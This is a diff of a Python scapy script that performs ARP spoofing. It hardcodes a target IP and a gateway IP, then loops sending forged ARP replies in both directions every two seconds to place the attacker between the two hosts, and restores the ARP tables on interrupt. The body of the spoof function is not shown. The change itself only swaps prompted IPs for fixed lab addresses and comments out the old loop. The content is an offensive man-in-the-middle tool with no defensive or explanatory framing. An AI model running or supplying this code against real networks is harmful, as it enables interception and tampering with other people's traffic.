@@ -28,20 +28,35 @@ def restore(dest_ip, src_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-# target_ip = "10.0.2.10"
-# gateway_ip = "10.0.2.1"
+target_ip = "10.0.2.10"
+gateway_ip = "10.0.2.1"
 
-ip_address = {"target_ip": raw_input("Target ip > "), "gateway_ip": raw_input("Gateway ip > ")}
+#ip_address = {"target_ip": raw_input("Target ip > "), "gateway_ip": raw_input("Gateway ip > ")}
 sent_packets_count = 0
+
 try:
     while True:
-        spoof(ip_address['target_ip'], ip_address['gateway_ip'])
-        spoof(ip_address['gateway_ip'], ip_address['target_ip'])
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent: " + str(sent_packets_count)),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("[-} Detected CTRL + C ...... Resetting ARP tables.... Please wait.\n.")
-    restore(ip_address['target_ip'], ip_address['gateway_ip'])
-    restore(ip_address['gateway_ip'], ip_address['target_ip'])
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+
+#try:
+#    while True:
+ #       spoof(ip_address['target_ip'], ip_address['gateway_ip'])
+  #      spoof(ip_address['gateway_ip'], ip_address['target_ip'])
+   #     sent_packets_count = sent_packets_count + 2
+    #    print("\r[+] Packets sent: " + str(sent_packets_count)),
+     #   sys.stdout.flush()
+      #  time.sleep(2)
+#except KeyboardInterrupt:
+ #   print("[-} Detected CTRL + C ...... Resetting ARP tables.... Please wait.\n.")
+  #  restore(ip_address['target_ip'], ip_address['gateway_ip'])
+   # restore(ip_address['gateway_ip'], ip_address['target_ip'])
+
